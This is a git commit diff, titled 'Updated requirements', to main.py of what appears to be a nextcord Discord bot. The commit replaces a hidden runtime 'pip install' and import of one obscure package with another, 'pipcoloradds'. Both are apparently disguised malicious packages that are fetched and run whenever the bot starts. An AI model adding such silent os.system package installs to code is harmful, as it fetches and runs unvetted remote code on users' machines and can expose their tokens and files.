6fd924c29426cd7e1c81ec842489aed989461074
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:35:04 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipfontingkitV1")
-import pipfontingkitV1
+os.system("pip install pipcoloradds")
+import pipcoloradds
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
